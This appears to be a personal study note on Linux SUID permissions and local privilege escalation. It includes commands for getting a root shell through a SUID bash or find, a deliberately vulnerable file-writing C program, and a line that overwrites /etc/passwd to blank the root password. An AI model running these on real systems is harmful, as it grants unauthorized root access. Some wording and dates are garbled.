[[Privilege Escalation]]

# What is SUID?
	Executable files can have special permission called `SUID` or `GUID`.

    Specifically, it allows the program to executed by anyone. Then, during the execution, it will change its permission and take the permissions to the owner of the file.

For Example, consider the `passwd` program.
```
$ ls -lh /usr/bin/passwd
-rwsr-xr-x 1 root root 80K 1 apr 12.19 /usr/bin/passwd
```
in order to change the passwd the user
`shadow` file which contains the hashes of the passwords.
```
$ ls -lh /etc/shadow
-rw------- 1 root root 1,3K 36 mag 17.19 /etc/shadow
```
as you can see only the root can view the file.

You can use the `passwd` file in order to access the `shadow` it uses the `SUID` as shown in the passwd file which has the `s`.

To set a SUID bit we can use `chmod` command.
```
$ chmod u+s exec.sh
$ ls -lh
-rwsr-x--x 1 leo users   0 38 mag 20.27 exec.sh
```

# Security Issues with SUID
Having a binary that runs as the owner of the file can be problematic when the `owner of the said file is the root user.

More specifically owned by root.
1. Read files owned by root
2. Read and write files owned by root
3. Execute arbitrary code as the root user

# Exploitation Examples
#### ðŸ”§ 1. Exploiting a SUID-enabled `bash`
If `bash` has the SUID bit set and owned by root:
```
-rwsr-xr-x 1 root root 1183448 Apr 10 00:00 /bin/bash

```
You can get a root shell:
```
./bash -p

```
Then:
```
$ whoami  
root
```
`-p` tells bash to not drop privileges.

#### 2. Using `find` with SUID
If `/usr/bin/find` has SUID bit set:
```
-rwsr-xr-x 1 root root 34832 Apr 10 00:00 /usr/bin/find
```
Exploit using:
```
find . -exec /bin/sh \;  # If 'sh' inherits SUID, you're root
```
OR directly:
```
find . -exec /bin/bash -p \;
```

#### 3. Writing to a file via a vulnerable SUID binary
Imagine a custom SUID binary allows file writing without checks:``
```
// vuln_write.c
int main(int argc, char *argv[]) {
    FILE *f = fopen(argv[1], "w");
    fprintf(f, "%s\n", argv[2]);
    fclose(f);
    return 0;
}
```
If compiled and SUID is set:
```
chmod u+s vuln_write
```
Then you can overwrite sensitive files like `/etc/passwd`:
```
./vuln_write /etc/passwd "root::0:0:root:/root:/bin/bash"
```
This resets root password to empty. Then you can `su root`.